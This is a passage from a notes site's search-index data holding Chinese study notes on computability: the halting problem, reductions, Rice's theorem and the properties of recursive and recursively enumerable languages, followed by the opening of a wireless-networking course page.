\\text{\u56fe\u7075\u673a}~M\\text{\u5728\u8f93\u5165}~w\\text{\u4e0a\u505c\u673a}\\}\\)\u3002\u663e\u7136 \\(H\\) \u662f\u9012\u5f52\u53ef\u679a\u4e3e\uff08r.e.\uff09\u7684\uff0c\u56e0\u4e3a\u4e07\u80fd\u56fe\u7075\u673a\u53ef\u4ee5\u679a\u4e3e\u6240\u6709\u505c\u673a\u5bf9\u3002\u4f46\u5b9a\u7406\u6307\u51fa \\(H\\) \u4e0d\u53ef\u9012\u5f52\uff08\u4e0d\u53ef\u5224\u5b9a\uff09\uff0c\u5373\u6ca1\u6709\u7b97\u6cd5\u80fd\u5bf9\u4efb\u610f \\((M,w)\\) \u5224\u5b9a\u662f\u5426\u505c\u673a\u3002</p> <p>\u8be5\u5b9a\u7406\u7684\u8bc1\u660e\u5229\u7528\u7c7b\u4f3c\u81ea\u6307\u7684\u5f52\u8c2c\u6cd5\uff1a\u82e5 \\(H\\) \u53ef\u5224\u5b9a\uff0c\u5219\u53ef\u6784\u9020\u65b0\u673a\u5224\u5b9a \\(H_1=\\{\\langle M\\rangle: M \\text{\u5728\u8f93\u5165\u81ea\u5df1}\\langle M\\rangle\\text{\u4e0a\u505c\u673a}\\}\\)\uff1b\u8fdb\u4e00\u6b65\u63a8\u5bfc\u51fa\u77db\u76fe\u3002\u8fd9\u540c\u65f6\u8bf4\u660e\u9012\u5f52\u8bed\u8a00\u7c7b\u4e25\u683c\u5305\u542b\u4e8e\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00\u7c7b\uff0c\u4e14\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00\u4e0d\u5c01\u95ed\u4e8e\u53d6\u8865\uff08\u7c7b RE \u5728\u53d6\u8865\u4e0b\u4e00\u822c\u4e0d\u53ef\u518d RE\uff09\u3002</p>"},{"location":"Courses/tcs/Topic4/#undecidable-problems","title":"Undecidable Problems","text":"<p>\u4e0d\u80fd\u88ab\u7b97\u6cd5\u89e3\u51b3\u7684\u95ee\u9898\u88ab\u79f0\u4e3a Undecidable Problems \u6216 Unsolvable Problems\u3002</p> <p>\u3010Definition\u3011 \u82e5\u5b58\u5728\u53ef\u8ba1\u7b97\u51fd\u6570 \\(\\tau:\\Sigma^* \\to\\Sigma^*\\)\uff0c\u4f7f\u5f97\u5bf9\u4e8e\u4efb\u610f\u5b57\u7b26\u4e32 \\(x\\)\uff0c\u5982\u679c \\(x\\in L_1\\) \u5f53\u4e14\u4ec5\u5f53 \\(\\tau(x)\\in L_2\\)\uff0c\u5219\u79f0 \\(L_1\\) \u53ef\u5f52\u7ea6\uff08reduce\uff09\u5230 \\(L_2\\)\uff0c\u7528 \\(L_1 \\le _P L_2\\) \u8868\u793a\u3002</p> <p>\u5f52\u7ea6\u662f\u8ba1\u7b97\u7406\u8bba\u4e2d\u6838\u5fc3\u6280\u5de7\uff0c\u5e38\u7528\u4e8e\u6bd4\u8f83\u95ee\u9898\u96be\u5ea6\u53ca\u8bc1\u660e NP-\u5b8c\u5168\u6027 \u6216\u4e0d\u53ef\u5224\u5b9a\u6027</p> <p>\u82e5\u53ef\u5224\u5b9a\uff08\u9012\u5f52\uff09\u95ee\u9898 \\(L_2\\) \u53ef\u7528\u7b97\u6cd5\u89e3\u51b3\uff0c\u5219\u901a\u8fc7 Recursive Function \\(\\tau\\) \u53ef\u6784\u9020\u7b97\u6cd5\u89e3\u51b3 \\(L_1\\)\uff1b\u53cd\u4e4b\u82e5 \\(L_1\\) \u4e0d\u53ef\u5224\u5b9a\u4e14 \\(L_1\\leq_P L_2\\) \u5219 \\(L_2\\) \u4e5f\u4e0d\u53ef\u5224\u5b9a\u3002\u7c7b\u4f3c\u5730\uff0c\u9012\u5f52\u53ef\u679a\u4e3e\u7684\u6027\u8d28\u4e5f\u53ef\u901a\u8fc7\u5f52\u7ea6\u5f97\u51fa\uff1a\u82e5 \\(L_2\\) \u53ef\u679a\u4e3e\uff0c\u5219 \\(L_1\\) \u53ef\u679a\u4e3e\uff1b\u82e5 \\(L_1\\) \u4e0d\u53ef\u679a\u4e3e\uff0c\u5219 \\(L_2\\) \u4e5f\u4e0d\u53ef\u679a\u4e3e\u3002</p> <p>\u603b\u7ed3\uff0c\u5728 \\(L_1 \\le_P L_2\\) \u7684\u60c5\u51b5\u4e0b</p> <ul> <li>\u5982\u679c \\(L_1\\) not recursive\uff0c\u5219 \\(L_2\\) not recursive</li> <li>\u5982\u679c \\(L_1\\) not r.e.\uff0c\u5219 \\(L_2\\) not r.e.</li> <li>\u5982\u679c \\(L_2\\) recursive\uff0c\u5219 \\(L_1\\) recursive</li> <li>\u5982\u679c \\(L_2\\) r.e.\uff0c\u5219 \\(L_1\\) r.e.</li> </ul> <p>\u901a\u8fc7\u5f52\u7ea6\u53ef\u8bc1\u660e\u4e0b\u5217\u95ee\u9898\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\uff1a</p> <ul> <li>(a) \u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\) \u548c\u8f93\u5165\u4e32 \\(w\\)\uff0c\u5224\u65ad \\(M\\) \u662f\u5426\u5728 \\(w\\) \u4e0a\u505c\u673a\uff08\u5373\u7ecf\u5178\u505c\u673a\u95ee\u9898\uff09\u3002</li> <li>(b) \u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\)\uff0c\u5224\u65ad \\(M\\) \u662f\u5426\u5728\u7a7a\u5b57\u7b26\u4e32\u4e0a\u505c\u673a\u3002</li> <li>(c) \u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\)\uff0c\u5224\u65ad \\(M\\) \u662f\u5426\u5b58\u5728\u67d0\u4e2a\u8f93\u5165\u5b57\u7b26\u4e32\u4f7f\u5176\u505c\u673a\uff08\u8bed\u8a00\u662f\u5426\u975e\u7a7a\uff09\u3002</li> <li>(d) \u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\)\uff0c\u5224\u65ad \\(M\\) \u662f\u5426\u5bf9\u6240\u6709\u8f93\u5165\u90fd\u505c\u673a\uff08\u5373\u8bed\u8a00\u662f\u5426\u7b49\u4e8e \\(\\Sigma^*\\)\uff09\u3002</li> <li>(e) \u7ed9\u5b9a\u4e24\u53f0\u56fe\u7075\u673a \\(M_1,M_2\\)\uff0c\u5224\u65ad\u5b83\u4eec\u662f\u5426\u505c\u673a\u4e8e\u5b8c\u5168\u76f8\u540c\u7684\u8f93\u5165\u96c6\u3002</li> <li>(f) \u7ed9\u5b9a\u56fe\u7075\u673a \\(M\\)\uff0c\u5224\u65ad \\(M\\) \u6240\u8bc6\u522b\u7684\u8bed\u8a00\u662f\u5426\u662f\u6b63\u5219\u8bed\u8a00\uff1f\u662f\u5426\u662f\u4e0a\u4e0b\u6587\u65e0\u5173\uff1f\u662f\u5426\u662f\u9012\u5f52\u8bed\u8a00\uff1f</li> <li>(g) \u5b58\u5728\u4e00\u53f0\u56fa\u5b9a\u7684\u56fe\u7075\u673a \\(M^*\\) \u4f7f\u5f97\uff1a\u7ed9\u5b9a\u4efb\u610f\u8f93\u5165 \\(w\\)\uff0c\u5224\u65ad \\(M^*\\) \u662f\u5426\u5728 \\(w\\) \u4e0a\u505c\u673a\uff08\u5373\u505c\u673a\u95ee\u9898\u7684\u201c\u56fa\u5b9a\u5b9e\u4f8b\u201d\u7248\u672c\uff09\u3002</li> </ul> <p>\u4ee5\u4e0a\u5404\u95ee\u9898\u5747\u53ef\u501f\u52a9\u505c\u673a\u95ee\u9898\u6216 Rice \u5b9a\u7406\u8bc1\u660e\u5176\u4e0d\u53ef\u5224\u5b9a\u6027\u3002\u4f8b\u5982\uff0c\u53ef\u6784\u9020\u6620\u5c04\u5f52\u7ea6\u628a (a) \u5f52\u7ea6\u5230 (b)\uff1a</p> <ul> <li>\\(H=\\{Mw \\;|\\; M \\text{ halts on } w\\}\\)</li> <li>\\(L=\\{M \\;|\\; M \\text{ halts on } e\\}\\)</li> <li>\\(f(Mw)=\\text{the encoding of } M_w = \\{\\text{if input } x\\ne e \\text{, reject; else run } M \\text{ on } w\\text{; if } M \\text{ Halts, accept}\\}\\)<ul> <li>\u5bf9\u4e8e \\(Mw \\in H\\)\uff0c\u4e00\u5b9a\u6709 \\(f(Mw)\\in L\\)</li> <li>\u5bf9\u4e8e \\(Mw\\notin H\\)\uff0c\u4e00\u5b9a\u6709 \\(f(Mw) \\notin L\\)\uff08\u56e0\u4e3a \\(M\\) \u4e0d\u5728 \\(w\\) \u4e0a\u505c\u673a\uff0c\u4e00\u5b9a\u88ab\u62d2\u7edd\uff09</li> <li>\u56e0\u6b64\u6709 \\(H\\le_P L\\)</li> </ul> </li> </ul> <p>\u56e0\u4e3a \\(H\\) \u662f\u4e0d\u53ef\u9012\u5f52\u7684\uff0c\u56e0\u6b64 \\(L\\) \u4e5f\u4e0d\u53ef\u9012\u5f52\u3002</p> \u5bf9\u4e8e\u5176\u5b83\u4f8b\u5b50\u6240\u6784\u9020\u7684\u53ef\u8ba1\u7b97\u51fd\u6570 \\(f\\) <ul> <li>(c) \u4ece (b) \u5f52\u7ea6\u81f3 (c)\uff1a\\(f(M)=\\text{the encoding of } M_e = \\{\\text{1. Erase the input } x \\text{; 2. run M on } e \\text{; 3. if } M\\text{ halts, accept}\\}\\)<ul> <li>\u8fd9\u6837\uff0c\u5bf9\u4e8e\u4efb\u4f55\u4e0d\u5728\u7a7a\u4e32\u4e0a\u505c\u673a\u7684\u56fe\u7075\u673a \\(M\\)\uff0c\\(f(M)\\) \u4e00\u5b9a\u4f1a\u88ab\u62d2\u7edd</li> </ul> </li> <li>(e) \u4ece (d) \u5f52\u7ea6\u81f3 (e)\uff1a\\(f(M_1)=\\text{the encoding of } M_1 M_2 = \\{\\text{1. } M_2 \\text{ \u662f\u5728\u6240\u6709\u8f93\u5165\u4e0a\u505c\u673a\u7684\u673a\u5668 }  \\text{; 2. run }  M_1\\text{ on } x \\text{; 3. if } M_1\\text{ halts, accept}\\}\\)<ul> <li>\u5bf9\u4e8e\u67d0\u4e2a\u4e0d\u5728\u6240\u6709\u8f93\u5165\u4e0a\u505c\u673a\u7684\u673a\u5668 \\(M\\)\uff0c\u4e00\u5b9a\u6709 \\(f(M)\\) \u7684\u8fd4\u56de\u503c \\(M_1 M_2\\) \u4e24\u53f0\u673a\u5668\u5728\u4e0d\u540c\u8f93\u5165\u4e0a\u4e0d\u540c\u65f6\u505c\u673a\uff08\u5373\u5b58\u5728\u67d0\u4e2a\u8f93\u5165 \\(w\\)\uff0c\u4f7f\u5f97 \\(M_1\\) \u4e0d\u5728 \\(w\\) \u4e0a\u505c\u673a\uff0c\u800c \\(M_2\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\uff09</li> </ul> </li> </ul> <p>\u53ef\u5224\u5b9a\u95ee\u9898\u793a\u4f8b\uff1a\u5e76\u975e\u6240\u6709\u770b\u4f3c\u590d\u6742\u7684\u95ee\u9898\u90fd\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\u3002\u4f8b\u5982\uff1a</p> <ul> <li>\u6709\u7a77\u81ea\u52a8\u673a\u8bed\u8a00\u5305\u542b\u6027: \u7ed9\u5b9a\u6709\u9650\u81ea\u52a8\u673a FA \\(M_1,M_2\\)\uff0c\u5224\u65ad\u662f\u5426 \\(L(M_1)\\subseteq L(M_2)\\)\u3002\u8fd9\u53ef\u5316\u4e3a\u201c\\(L(M_1)\\cap (\u03a3^*-L(M_2))=\\emptyset\\)\u201d\u7684\u7a7a\u8bed\u8a00\u6d4b\u8bd5\u95ee\u9898\uff0c\u901a\u8fc7\u904d\u5386\u68c0\u67e5\u662f\u5426\u5b58\u5728\u53ef\u8fbe\u7ec8\u6b62\u72b6\u6001\u6765\u89e3\u51b3\u3002\u56e0\u6b64\u81ea\u52a8\u673a\u5305\u542b\u6027\u662f\u53ef\u5224\u5b9a\u7684\u3002</li> <li>\u673a\u5668\u8bed\u8a00\u8ba1\u6570\u6027: \u8bed\u8a00 \\(L(M)\\) \u603b\u662f\u53ef\u5217\uff08countable\uff09\uff0c\u56e0\u6b64\u5224\u65ad \\(L(M)\\) \u662f\u5426\u53ef\u5217\u6216\u4e0d\u53ef\u5217\u662f\u5e73\u51e1\u7684\u53ef\u5224\u5b9a\u95ee\u9898\u3002\u5176\u4ed6\u7c7b\u4f3c\u7684\u6027\u8d28\u5982\u201c\u662f\u5426\u5b58\u5728\u4e00\u4e2a\u8f93\u5165\u4f7f\u5f97 \\(M\\) \u5728 \\(|M|\\) \u6b65\u5185\u505c\u673a\u201d\u7b49\uff0c\u4e5f\u53ef\u901a\u8fc7\u679a\u4e3e\u6709\u9650\u8f93\u5165\u5e76\u6a21\u62df\u89e3\u51b3\u3002</li> </ul> <p>\u4f8b\u5982\uff0c\u4ee4  </p> \\[L_{even}=\\{\u27e8M\u27e9\u2223M\u00a0\u7684\u8bed\u8a00\u00a0L(M)\u00a0\u4e2d\u81f3\u5c11\u5305\u542b\u4e00\u4e2a\u542b\u6709\u5076\u6570\u4e2a\u00a0b\u00a0\u7684\u5b57\u7b26\u4e32\\}\\] <p>\u53ef\u4ee5\u8bc1\u660e \\(L_{\\text{even}}\\) \u662f\u9012\u5f52\u53ef\u679a\u4e3e\u800c\u4e0d\u53ef\u9012\u5f52\u7684\u3002\u5176\u53ef\u679a\u4e3e\u6027\u901a\u8fc7\u4ea4\u9519\u6a21\u62df \\(M\\) \u5728\u6240\u6709\u5b57\u7b26\u4e32\u4e0a\u7684\u884c\u4e3a\u5f97\u5230\uff1b\u5176\u4e0d\u53ef\u5224\u5b9a\u6027\u5219\u901a\u8fc7\u505c\u673a\u95ee\u9898\u5f52\u7ea6\uff1a\u6784\u9020\u65b0\u673a \\(M'\\) \u4f7f\u5f97 \\(L(M')={\\varepsilon}\\) \u5f53\u4e14\u4ec5\u5f53\u539f\u673a \\(M\\) \u5728\u7a7a\u4e32\u4e0a\u505c\u673a\uff08\\(\\varepsilon\\) \u542b 0 \u4e2a \\(b\\)\uff0c0 \u4e3a\u5076\u6570\uff09\uff0c\u4ece\u800c\u5c06 \\(H\\) \u5f52\u7ea6\u5230 \\(L_{\\text{even}}\\)\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0c\u8be5\u8bed\u8a00\u4e5f\u53ef\u4ee5\u901a\u8fc7 Rice \u5b9a\u7406\u6765\u8bc1\u660e\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\uff1a</p> <ul> <li>\u6307\u6807\u96c6\uff08Index Set\uff09\uff1a\u8bbe \\(C\\) \u662f R.E. \u8bed\u8a00\u7c7b\u7684\u4e00\u4e2a\u5b50\u96c6\uff08\u5373\u4e00\u7c7b\u8bed\u8a00\u7684\u96c6\u5408\uff09\u3002\u5b9a\u4e49\u6307\u6807\u96c6 \\(\\mathcal{F}(C) = \\{ \\langle M \\rangle \\mid L(M) \\in C \\}\\)\u3002\u8fd9\u4ee3\u8868\u4e86\u6240\u6709\u8bc6\u522b\u5c5e\u4e8e \\(C\\) \u7c7b\u8bed\u8a00\u7684\u56fe\u7075\u673a\u7684\u7f16\u7801\u96c6\u5408\u3002</li> <li>\u975e\u5e73\u51e1\u5c5e\u6027\uff08Non-trivial Property\uff09\uff1a\u5c5e\u6027 \\(C\\) \u88ab\u79f0\u4e3a\u975e\u5e73\u51e1\u7684\uff0c\u5982\u679c\uff1a<ul> <li> <ol> <li>\\(C \\neq \\emptyset\\)\uff08\u81f3\u5c11\u6709\u4e00\u4e2a R.E. \u8bed\u8a00\u6ee1\u8db3\u8be5\u5c5e\u6027\uff09\u3002</li> </ol> </li> <li> <ol> <li>\\(C \\neq \\text{\u6240\u6709 R.E. \u8bed\u8a00}\\)\uff08\u81f3\u5c11\u6709\u4e00\u4e2a R.E. \u8bed\u8a00\u4e0d\u6ee1\u8db3\u8be5\u5c5e\u6027\uff09\u3002</li> <li>\u6216\u8005\u7b80\u5355\u5730\u8bf4\uff0c\u5b58\u5728 \\(M_1, M_2\\) \u4f7f\u5f97 \\(L(M_1) \\in C\\) \u4e14 \\(L(M_2) \\notin C\\)\u3002</li> </ol> </li> </ul> </li> </ul> <p>Rice \u5b9a\u7406\u58f0\u660e\uff0c\u5bf9\u4e8e\u4efb\u4f55\u975e\u5e73\u51e1\u5c5e\u6027 \\(C\\)\uff0c\u8bed\u8a00 \\(\\mathcal{F}(C)\\) \u662f\u4e0d\u53ef\u5224\u5b9a\u7684\u3002</p> <p>\u6211\u4eec\u901a\u8fc7\u5f52\u7ea6 \\(H\\le_P \\mathcal{F}(C)\\) \u6765\u8bc1\u660e\u8be5\u5b9a\u7406\uff1a</p> <ul> <li>\u4e0d\u59a8\u5047\u8bbe\u7a7a\u8bed\u8a00 \\(\\emptyset \\notin C\\)\uff08\u82e5 \\(\\in C\\)\uff0c\u5219\u8003\u8651\u8865\u96c6 \\(\\overline{C}\\)\uff09\u3002\u7531\u4e8e \\(C\\) \u975e\u5e73\u51e1\uff0c\u5b58\u5728 \\(L_{in} \\in C\\)\uff0c\u8bbe\u8bc6\u522b \\(L_{in}\\) \u7684\u673a\u5668\u4e3a \\(M_{in}\\)\u3002</li> <li>\u7ed9\u5b9a\u505c\u673a\u95ee\u9898\u5b9e\u4f8b \\(\\langle M, w \\rangle\\)\uff0c\u6784\u9020\u673a\u5668 \\(M'\\)\uff1a<ul> <li>\\(M'\\) \u5bf9\u8f93\u5165 \\(x\\) \u7684\u884c\u4e3a\uff1a<ul> <li>\u9996\u5148\u6a21\u62df \\(M\\) \u5728 \\(w\\) \u4e0a\u7684\u8fd0\u884c\uff08\u5ffd\u7565 \\(x\\)\uff09\u3002</li> <li>\u5982\u679c \\(M\\) \u5728 \\(w\\) \u4e0a\u4e0d\u505c\u673a\uff0c\\(M'\\) \u5c31\u6b7b\u5faa\u73af \\(\\implies L(M') = \\emptyset \\notin C\\)\u3002</li> <li>\u5982\u679c \\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a\uff0c\u5219 \\(M'\\) \u7ee7\u7eed\u8fd0\u884c \\(M_{in}\\) \u5bf9 \\(x\\) \u7684\u6a21\u62df \\(\\implies L(M') = L(M_{in}) \\in C\\)\u3002</li> </ul> </li> </ul> </li> <li>\u5f52\u7ea6\u5173\u7cfb\uff1a\\(M\\) \u5728 \\(w\\) \u4e0a\u505c\u673a \\(\\iff L(M') \\in C\\)\u3002</li> <li>\u56e0\u4e3a \\(H\\) \u4e0d\u53ef\u5224\u5b9a\uff0c\u6545\u5224\u5b9a \\(L(M') \\in C\\) \u4e5f\u4e0d\u53ef\u80fd\u3002</li> </ul> <p>\u901a\u4fd7\u6765\u8bb2\uff0c\u5224\u65ad \\(L(M)\\) \u662f\u5426\u5177\u6709\u67d0\u79cd\u975e\u5e73\u51e1\u6027\u8d28\uff08\u5982\u6b63\u5219\u3001\u4e0a\u4e0b\u6587\u65e0\u5173\u3001\u9012\u5f52\uff09\u90fd\u662f\u4e0d\u53ef\u5224\u5b9a\u7684</p> <p>\u8bed\u6cd5\u4e0e\u8bed\u4e49\u7684\u5bf9\u7acb</p> <p>Rice\u5b9a\u7406\u7684\u6838\u5fc3\u6d1e\u89c1\u5728\u4e8e\u533a\u5206\u8bed\u6cd5\u5c5e\u6027\uff08Syntactic Properties\uff09\u4e0e\u8bed\u4e49\u5c5e\u6027\uff08Semantic Properties\uff09\u3002</p> <ul> <li>\u8bed\u4e49\u5c5e\u6027\uff1a\u4ec5\u4f9d\u8d56\u4e8e \\(L(M)\\)\u3002\u4f8b\u5982\uff1a\u201c\\(L(M)\\) \u662f\u7a7a\u7684\u201d\u3001\u201c\\(L(M)\\) \u662f\u6b63\u5219\u7684\u201d\u3001\u201c\\(L(M)\\) \u5305\u542b\u4e32\u2018abc\u2019\u201d\u3002\u8fd9\u4e9b\u6839\u636eRice\u5b9a\u7406\u5168\u662f\u4e0d\u53ef\u5224\u5b9a\u7684\u3002</li> <li>\u8bed\u6cd5\u5c5e\u6027\uff1a\u4f9d\u8d56\u4e8e \\(M\\) \u7684\u5177\u4f53\u5b9e\u73b0\uff08\u7f16\u7801\uff09\u3002\u4f8b\u5982\uff1a\u201c\\(M\\) \u67095\u4e2a\u72b6\u6001\u201d\u3001\u201c\\(M\\) \u572810\u6b65\u5185\u505c\u673a\u201d\u3002\u8fd9\u4e9b\u901a\u5e38\u662f\u53ef\u5224\u5b9a\u7684\uff0c\u56e0\u4e3a\u53ef\u4ee5\u76f4\u63a5\u68c0\u67e5 \\(\\langle M \\rangle\\) \u7684\u4ee3\u7801\u3002</li> </ul>"},{"location":"Courses/tcs/Topic4/#re-languages","title":"R.E. Languages","text":"<p>\u6df1\u5165\u7406\u89e3\u4e0d\u53ef\u5224\u5b9a\u6027\u9700\u8981\u5398\u6e05\u4e24\u79cd\u8bed\u8a00\u7c7b\u7684\u6027\u8d28\uff1a\u9012\u5f52\u8bed\u8a00\uff08Recursive/Decidable\uff09\u4e0e\u9012\u5f52\u53ef\u679a\u4e3e\u8bed\u8a00\uff08Recursively Enumerable, R.E.\uff09\u3002</p> <ul> <li>\u9012\u5f52\u8bed\u8a00\uff1a\u5b58\u5728\u4e00\u4e2a\u5224\u5b9a\u5668\uff08Decider\uff09 \\(M\\)\u3002\u5bf9\u4efb\u610f\u8f93\u5165 \\(w\\)\uff0c\\(M\\) \u5fc5\u5b9a\u5728\u6709\u9650\u6b65\u5185\u505c\u673a\u3002\u82e5 \\(w \\in L\\) \u5219\u8f93\u51fa ACCEPT\uff0c\u82e5 \\(w \\notin L\\) \u5219\u8f93\u51fa REJECT\u3002\u8fd9\u662f\u6700\u7406\u60f3\u7684\u7b97\u6cd5\u72b6\u6001\u3002</li> <li>R.E.\u8bed\u8a00\uff1a\u5b58\u5728\u4e00\u4e2a\u8bc6\u522b\u5668\uff08Recognizer\uff09 \\(M\\)\u3002\u82e5 \\(w \\in L\\)\uff0c\\(M\\) \u6700\u7ec8\u505c\u673a\u5e76\u63a5\u53d7\uff1b\u4f46\u82e5 \\(w \\notin L\\)\uff0c\\(M\\) \u53ef\u80fd\u62d2\u7edd\uff0c\u4e5f\u53ef\u80fd\u65e0\u9650\u5faa\u73af\uff08\u4e0d\u505c\u673a\uff09\u3002</li> </ul> <p>\u4e8b\u5b9e\u4e0a\uff0c\u6211\u4eec\u6709\u7406\u8bba\uff1a</p> \\[ L\\text{ is recursive iff } L \\text{ and } \\bar{L} \\text{ are both R.E.} \\] <ul> <li>\u8bc1\u660e (\\(\\Rightarrow\\))\uff1a\u9012\u5f52\u8bed\u8a00\u7c7b\u5bf9\u8865\u96c6\u5c01\u95ed\u3002\u82e5 \\(L\\) \u9012\u5f52\uff0c\u5219 \\(L\\) \u662f R.E.\uff0c\u4e14 \\(\\overline{L}\\) \u4e5f\u662f\u9012\u5f52\uff08\u4ece\u800c R.E.\uff09\u3002</li> <li>\u8bc1\u660e (\\(\\Leftarrow\\))\uff1a\u82e5 \\(L\\) \u6709\u8bc6\u522b\u5668 \\(M_1\\)\uff0c\\(\\overline{L}\\) \u6709\u8bc6\u522b\u5668 \\(M_2\\)\u3002\u6784\u9020\u5224\u5b9a\u5668 \\(D\\)\uff1a<ul> <li>\u5bf9\u8f93\u5165 \\(w\\)\uff0c\u5e76\u884c\uff08\u4ea4\u66ff\u6b65\u6570\uff09\u8fd0\u884c \\(M_1(w)\\) \u548c \\(M_2(w)\\)\u3002</li> <li>\u56e0\u4e3a \\(w\\) \u5fc5\u5728 \\(L\\) \u6216 \\(\\overline{L}\\) \u4e2d\uff0c\u6545 \\(M_1\\) \u6216 \\(M_2\\) \u5fc5\u6709\u4e00\u4e2a\u4f1a\u505c\u673a\u3002</li> <li>\u82e5 \\(M_1\\) \u505c\u673a\u63a5\u53d7 \\(\\implies w \\in L\\) \u8f93\u51fa ACCEPT\uff1b\u82e5 \\(M_2\\) \u505c\u673a\u63a5\u53d7 \\(\\implies w \\in \\overline{L}\\) \u8f93\u51fa REJECT\u3002</li> <li>\\(D\\) \u603b\u662f\u505c\u673a\uff0c\u6545 \\(L\\) \u662f\u9012\u5f52\u7684\u3002</li> </ul> </li> </ul> <p>\u8be5\u5b9a\u7406\u6709\u63a8\u8bba\uff1aR.E. \u8bed\u8a00 \\(H\\) \u7684\u8865\u96c6 \\(\\bar{H}\\) \u751a\u81f3\u4e0d\u662f R.E. \u7684</p> <p>\u679a\u4e3e\u5668\u662f\u4e00\u4e2a\u5e26\u6709\u6253\u5370\u673a\u7684\u56fe\u7075\u673a\uff0c\u5b83\u4e0d\u63a5\u53d7\u8f93\u5165\uff0c\u800c\u662f\u8fd0\u884c\u5e76\u6253\u5370\u51fa\u5b57\u7b26\u4e32\u5217\u8868\u3002</p> <ul> <li>R.E. \u7b49\u4ef7\u6027\uff1a\\(L\\) \u662f R.E. \\(\\iff L\\) \u80fd\u88ab\u67d0\u4e2a\u679a\u4e3e\u5668\u679a\u4e3e\uff08\u4e0d\u4e00\u5b9a\u6309\u987a\u5e8f\uff09\u3002<ul> <li>\u8bc1\u660e\uff1a\u8bc6\u522b\u5668 \\(M\\) \u53ef\u4ee5\u8f6c\u5316\u4e3a\u679a\u4e3e\u5668\uff0c\u901a\u8fc7\u201c\u9e3d\u5de2\u6a21\u62df\u201d\uff08Dovetailing\uff09\u5e76\u884c\u6a21\u62df \\(M\\) \u5bf9 \\(\\Sigma^*\\) \u4e2d\u6240\u6709\u4e32\u7684\u8fd0\u884c\uff0c\u51e1\u662f\u505c\u673a\u7684\u5c31\u6253\u5370\u3002</li> </ul> </li> <li>\u9012\u5f52\u7b49\u4ef7\u6027\uff1a\\(L\\) \u662f\u9012\u5f52\u7684 \\(\\iff L\\) \u80fd\u88ab\u67d0\u4e2a\u679a\u4e3e\u5668\u6309\u5b57\u5178\u5e8f\uff08Lexicographically\uff09\u679a\u4e3e\u3002<ul> <li>\u8bc1\u660e\uff1a<ul> <li>(\\(\\Leftarrow\\)) \u82e5\u80fd\u6309\u5e8f\u679a\u4e3e\uff0c\u5bf9\u4e8e\u8f93\u5165 \\(w\\)\uff0c\u53ea\u9700\u7b49\u5f85\u679a\u4e3e\u5668\u3002\u82e5\u6253\u5370\u51fa \\(w\\)\uff0c\u5219\u63a5\u53d7\uff1b\u82e5\u6253\u5370\u51fa\u6bd4 \\(w\\) \u5b57\u5178\u5e8f\u66f4\u5927\u7684\u4e32\uff0c\u8bf4\u660e \\(w\\) \u88ab\u8df3\u8fc7\uff0c\u5219\u62d2\u7edd\uff08\u56e0\u4e3a\u662f\u6309\u5e8f\u7684\uff0c\u540e\u9762\u4e0d\u53ef\u80fd\u518d\u51fa\u73b0 \\(w\\)\uff09\u3002\u8fd9\u5c31\u6784\u6210\u4e86\u5224\u5b9a\u5668\u3002</li> <li>(\\(\\Rightarrow\\)) \u82e5 \\(L\\) \u53ef\u5224\u5b9a\uff0c\u679a\u4e3e\u5668\u53ea\u9700\u6309\u5b57\u5178\u5e8f\u904d\u5386\u6240\u6709\u4e32\uff0c\u5bf9\u6bcf\u4e2a\u4e32\u8c03\u7528\u5224\u5b9a\u5668\uff0c\u82e5\u63a5\u53d7\u5219\u6253\u5370\u3002\u8fd9\u6837\u6253\u5370\u51fa\u6765\u7684\u81ea\u7136\u662f\u6709\u5e8f\u7684\u3002</li> </ul> </li> </ul> </li> </ul> <p>\u4e0d\u5b58\u5728\u8bc1\u660e\u9012\u5f52 / RE\u7684\u901a\u89e3</p> <ul> <li>\u8bc1\u660e \\(recursive(A)\\)<ul> <li>\u6784\u9020\u5224\u5b9a \\(A\\) \u7684\u56fe\u7075\u673a</li> <li>\\(\\exists B,\\; recursive(B) \\land (A\\le B)\\)</li> <li>\\(RE(A)\\land RE(\\overline{A})\\; \\Rightarrow \\; recursive(A)\\)</li> </ul> </li> <li>\u8bc1\u660e not \\(recursive(A)\\)<ul> <li>\u5bf9\u89d2\u5316\u6784\u9020</li> <li>\\(\\exists B,\\; not\\ recursive(B) \\land (B\\le A)\\)</li> </ul> </li> <li>\u8bc1\u660e \\(RE(A)\\)<ul> <li>\u6784\u9020\u534a\u5224\u5b9a \\(A\\) \u7684\u56fe\u7075\u673a</li> <li>\\(\\exists B,\\; RE(B) \\land (A\\le B)\\)</li> </ul> </li> <li>\u8bc1\u660e not \\(RE(A)\\)<ul> <li>\\(\\exists B,\\; not\\ RE(B) \\land (B\\le A)\\)</li> <li>\\(not\\ recursive(A) \\land \\ not\\ RE(\\overline{A}) \\; \\Rightarrow \\; not\\ RE(A)\\)</li> </ul> </li> </ul>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/","title":"Index","text":"<p> \u7ea6 166 \u4e2a\u5b57  \u9884\u8ba1\u9605\u8bfb\u65f6\u95f4 1 \u5206\u949f</p> <p>\u7531\u4e8e\u6211\u4e2a\u4eba\u5bf9\u8be5\u8bfe\u7a0b\u5185\u5bb9\u6bd4\u8f83\u611f\u5174\u8da3\uff0c\u867d\u7136\u53ea\u662f\u901a\u8bc6\u8bfe\u4ecd\u7136\u5e0c\u671b\u4e3a\u5176\u5199\u4e00\u4efd\u7b14\u8bb0</p>"},{"location":"Courses/%E6%97%A0%E7%BA%BF%E7%BD%91%E7%BB%9C%E5%BA%94%E7%94%A8/#_1","title":"\u5206\u6570\u6784\u6210","text":"<ul> <li>\u7ebf\u4e0b\u8bfe\u5802\u5b9e\u9a8c 20%<ul> <li>\u5fc5\u505a\u5b9e\u9a8c 15%</li> <li>\u9009\u505a\u5b9e\u9a8c 5%</li> </ul> </li> <li>\u7ebf\u4e0a\u5b66\u4e60\u6d3b\u52a8 10%</li> <li>\u671f\u672b\u5b9e\u9a8c\u603b\u7ed3 30%<ul> <li>\u5b9e\u9a8c\u56db 